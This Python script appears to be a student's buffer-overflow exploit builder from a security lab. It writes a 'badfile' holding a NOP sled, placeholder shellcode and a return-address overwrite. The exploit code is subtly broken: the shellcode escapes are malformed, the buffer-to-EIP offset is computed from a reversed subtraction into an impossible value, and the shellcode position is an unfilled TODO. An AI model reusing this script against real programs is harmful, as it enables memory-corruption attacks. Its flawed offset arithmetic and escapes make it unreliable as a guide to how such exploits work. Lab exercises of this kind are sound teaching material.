#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\0x10\0x11\0x12\0x13\0x14\0x15\0x16\0x17\0x1a"  # easier to spot where the buffer variable locates
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################

# address of the saved eip: 0x565563ee
# address of buffer: 0xffffcabc

# Put the shellcode somewhere in the payload
start = 0               # TODO: 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x565562ad     # the location of the function you want to jump to, e.g., jump to the start of bof again
offset = 0xAA5A920E      # distance between buffer and the saved eip (the spot in badfile that should contain the address of our malicious shellcode): 0x565563ee-0xffffcabc=0xAA5A920E

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
